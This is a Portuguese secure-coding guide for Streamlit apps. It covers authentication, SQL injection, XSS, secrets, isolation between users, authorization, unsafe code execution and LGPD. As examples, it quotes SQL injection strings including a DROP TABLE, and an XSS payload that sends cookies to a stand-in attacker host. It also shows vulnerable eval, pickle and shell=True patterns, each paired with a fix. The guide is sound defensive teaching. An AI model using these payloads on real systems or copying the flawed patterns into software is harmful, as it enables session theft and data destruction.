# 29 · Segurança

> **Nível:** avançado · **Escrito em:** 02/09/2026 · Streamlit 1.63.0

O Streamlit executa o **seu** código no servidor e mostra o resultado a quem abrir
a URL. Isso concentra risco num lugar só. Este arquivo lista o que checar, em
ordem de gravidade.

---

## 1. O modelo de ameaça, em uma tabela

| Ameaça | Quem | Impacto |
|---|---|---|
| **URL descoberta sem autenticação** | qualquer um | vazamento total |
| **Injeção de SQL** | usuário autenticado ou não | leitura e alteração do banco |
| **Autorização só na interface** | usuário legítimo com curiosidade | acesso a dado ou ação de outro papel |
| **Segredo no repositório** | qualquer um com acesso ao Git | credencial de produção |
| **Traceback na tela** | qualquer visitante | mapa do código e do banco |
| **XSS por `unsafe_allow_html`** | quem consegue gravar conteúdo | roubo de sessão de outro usuário |
| **Cache global sem isolamento** | outro usuário da mesma app | dado de um vaza para outro |
| **Dependência comprometida** | atacante da cadeia de suprimentos | execução de código no servidor |
| **Execução de entrada do usuário** (`eval`, `pickle`) | qualquer um | execução remota de código |

---

## 2. Autenticação: o item nº 1

Uma app de Streamlit **sem autenticação** é pública para quem tiver a URL. Não há
"segurança por obscuridade": a URL vaza no histórico do navegador, no log do
proxy, no chat da equipe, na captura de tela da reunião.

Ver [22-autenticacao-e-autorizacao.md](22-autenticacao-e-autorizacao.md). O
resumo: OIDC (`st.login`) ou proxy de autenticação. Nunca "é interno, não precisa".

---

## 3. Injeção de SQL

```python
# VULNERÁVEL
sql = f"SELECT * FROM pedidos WHERE canal = '{canal}'"

# canal = "x' OR '1'='1"        → devolve tudo
# canal = "x'; DROP TABLE pedidos; --"   → em bancos que aceitam múltiplos comandos
```

```python
# SEGURO
con.execute("SELECT * FROM pedidos WHERE canal = ?", (canal,))
```

**Lista de valores** — gere os marcadores pelo tamanho, nunca pelo conteúdo:

```python
marcadores = ",".join("?" * len(canais))
con.execute(f"SELECT * FROM pedidos WHERE canal IN ({marcadores})", list(canais))
```

**Nome de coluna e de tabela não podem ser parâmetro.** Lista branca:

```python
PERMITIDAS = {"data", "valor", "cliente"}
if coluna not in PERMITIDAS:
    raise ValueError("coluna não permitida")
```

**Não confie no widget como validação.** Um `selectbox` restringe o que o usuário
vê na tela; o valor chega ao servidor por WebSocket e pode ser qualquer coisa.
Valide de novo no servidor, sempre.

---

## 4. XSS e HTML não confiável

```python
# PERIGOSO se `comentario` vem do usuário ou do banco
st.markdown(f"<div>{comentario}</div>", unsafe_allow_html=True)
st.html(f"<div>{comentario}</div>")
```

Um comentário com `<img src=x onerror="fetch('https://mau.exemplo/'+document.cookie)">`
executa no navegador de **quem abrir a página**.

**Regras:**

1. Sem `unsafe_allow_html`, o Markdown do Streamlit já escapa HTML. **Prefira o
   padrão.**
2. Se precisar de HTML, **nunca** interpole conteúdo dinâmico. HTML fixo, dados
   por fora:

```python
st.html("<div class='cartao'></div>")
st.write(comentario)                    # escapado, seguro
```

3. Se **precisa mesmo** interpolar, escape:

```python
import html
st.html(f"<div class='cartao'>{html.escape(comentario)}</div>")
```

4. `st.html(..., unsafe_allow_javascript=True)` executa JavaScript. Nunca com
   conteúdo dinâmico.

**O mesmo vale para `column_config.MarkdownColumn` e `LinkColumn`**: se a URL vem
do banco, um `javascript:` no lugar de `https:` é um vetor. Valide o esquema.

---

## 5. Proteção XSRF e CORS

```toml
[server]
enableXsrfProtection = true      # padrão, e deve continuar assim
enableCORS = true
```

O erro que leva as pessoas a desligar isso é um **403 no upload de arquivo**
atrás de proxy. A causa quase sempre é o proxy não repassando o cabeçalho `Host`
ou o cookie. **Desligar a proteção esconde o sintoma e abre a app.** Conserte o
proxy (ver [28](28-deploy-e-operacao.md)).

`server.allowedHosts` (1.60+) protege contra *DNS rebinding*: preencha com o(s)
domínio(s) reais em produção.

---

## 6. Segredos

**Nunca** no código, **nunca** no Git.

```
# .gitignore
.streamlit/secrets.toml
.env
```

Prefira variável de ambiente a arquivo em produção. E, se um segredo vazou para o
Git: **rotacione**. Reescrever o histórico não resolve — quem clonou já tem, e o
GitHub guarda objetos órfãos por um tempo.

**Não imprima segredo na tela**, nem em depuração:

```python
st.write(st.secrets)          # NUNCA. Vai para a tela de quem estiver olhando.
```

Ver [`variaveis-de-ambiente-e-segredos`](../variaveis-de-ambiente-e-segredos/00-MAPA.md).

---

## 7. Erros e informação vazada

```toml
[client]
showErrorDetails = "none"     # produção
```

O traceback mostra caminhos, nomes de função, trechos de SQL e às vezes valores.
Para quem quer atacar, é um mapa.

**E não vaze pelo tempo de resposta.** Em autenticação, "usuário não existe" e
"senha errada" precisam demorar o mesmo tanto — senão o relógio revela quais
e-mails estão cadastrados. O
[`nucleo/auth.py`](07-projeto-modelo/nucleo/auth.py) faz isso de propósito, com
comentário explicando.

---

## 8. Isolamento entre usuários

Três formas de um usuário ver o dado de outro:

**1. Variável global do módulo**

```python
usuario_atual = None       # COMPARTILHADA por todas as sessões
```

**2. `cache_resource` com objeto mutável**

```python
@st.cache_resource
def carrinho() -> dict:      # o MESMO dicionário para todo mundo
    return {}
```

**3. `cache_data` global sem o usuário na chave**

```python
@st.cache_data(ttl=300)
def meus_pedidos(_usuario):        # o `_` tira o usuário da chave!
    return consultar(_usuario)     # o primeiro que chamar define o resultado de todos
```

Correções: estado de usuário sempre em `st.session_state`; cache de dado
segmentado com `scope="session"`; e o usuário **na chave**, sem `_`.

---

## 9. Autorização no lugar certo

```python
# ERRADO: a checagem está perto do botão
if usuario.papel == "admin":
    if st.button("Excluir tudo"):
        excluir_tudo()

# CERTO: a checagem está DENTRO da ação
def excluir_tudo(usuario: Usuario) -> None:
    if usuario.papel != "admin":
        raise PermissionError("sem permissão")
    ...
```

E o filtro por permissão vai **no SQL**:

```python
# ERRADO: os dados dos outros já vieram para a memória
df = todos_os_pedidos()
df = df[df.vendedor == usuario.email]

# CERTO
df = pedidos_do_vendedor(usuario.email)
```

---

## 10. Execução de código: nunca

```python
# NUNCA, em nenhuma circunstância
eval(st.text_input("Fórmula"))
exec(codigo_do_usuario)
pickle.loads(arquivo_enviado.getvalue())      # pickle executa código ao desserializar
yaml.load(texto)                              # use yaml.safe_load
os.system(f"convert {arquivo.name}")          # injeção de comando
subprocess.run(f"ls {caminho}", shell=True)   # idem
```

Se você **precisa** de expressão do usuário (uma calculadora de fórmula, por
exemplo), use um avaliador restrito (`asteval`, `simpleeval`) — nunca `eval`.

Para subprocesso, passe lista e sem `shell=True`:

```python
subprocess.run(["convert", caminho_seguro, saida], check=True, timeout=30)
```

---

## 11. Cadeia de suprimentos

```bash
pip install pip-audit && pip-audit          # vulnerabilidades conhecidas
uv pip compile --generate-hashes            # trava com hash
```

- **Fixe versões** (`==`), não faixas.
- **Trave com hash** onde for possível.
- **Confira o nome do pacote** — *typosquatting* (`strealit`, `panads`) é real.
- **Avalie componente da comunidade** como código que roda no navegador dos seus
  usuários (ver [25](25-componentes-customizados.md)).
- Rode `pip-audit` no CI.

---

## 12. LGPD e dado pessoal

Não é jurídico; é o mínimo operacional que engenharia controla:

- **minimize**: não traga colunas de dado pessoal que o painel não usa;
- **mascare** na exibição: `123.***.***-45`;
- **registre** quem viu o quê (auditoria) quando o dado é sensível;
- **atenção à região**: o Community Cloud hospeda **nos Estados Unidos**, sem
  opção — o que costuma ser impeditivo para dado pessoal de brasileiro sem base
  legal e salvaguardas;
- **nada de dado pessoal na URL** (`bind="query-params"`): a query string entra no
  histórico do navegador e nos logs do proxy;
- **cuidado com `st.context.ip_address`**: endereço IP é dado pessoal.

---

## 13. Lista de verificação

**Crítico**
- [ ] Autenticação obrigatória.
- [ ] HTTPS.
- [ ] Todo SQL parametrizado; nomes de coluna por lista branca.
- [ ] Nenhum segredo no repositório.
- [ ] `showErrorDetails = "none"`.
- [ ] Nenhum `eval`/`exec`/`pickle.loads` sobre entrada do usuário.

**Alto**
- [ ] Autorização verificada dentro da ação, não perto do botão.
- [ ] Filtro por permissão no SQL.
- [ ] `enableXsrfProtection = true`; `allowedHosts` preenchido.
- [ ] Nenhum estado de usuário em global ou `cache_resource`.
- [ ] `cache_data` com `scope="session"` onde o dado é segmentado.
- [ ] Sem `unsafe_allow_html` com conteúdo dinâmico.

**Médio**
- [ ] Upload validado (tamanho, tipo, conteúdo, nome saneado).
- [ ] Dependências fixadas e auditadas.
- [ ] Auditoria de ações sensíveis.
- [ ] Contêiner com usuário sem privilégio.
- [ ] Backup testado.

---

## Autoteste

1. Por que "é interno, não precisa de login" é falso?
2. Como filtrar por uma lista de valores sem abrir injeção? E ordenar por coluna
   escolhida pelo usuário?
3. Por que o `selectbox` não é validação?
4. Dê o exemplo concreto de XSS via `unsafe_allow_html` e as quatro regras.
5. Por que **não** desligar `enableXsrfProtection` quando o upload dá 403?
6. Cite as três formas de um usuário ver o dado de outro, e a correção de cada uma.
7. Onde a verificação de permissão tem de estar, e por que perto do botão não
   basta?
8. Por que `pickle.loads` sobre arquivo enviado é execução remota de código?
9. Quatro cuidados de LGPD específicos de uma app Streamlit.
10. Por que vazar pelo tempo de resposta é um problema em tela de login?
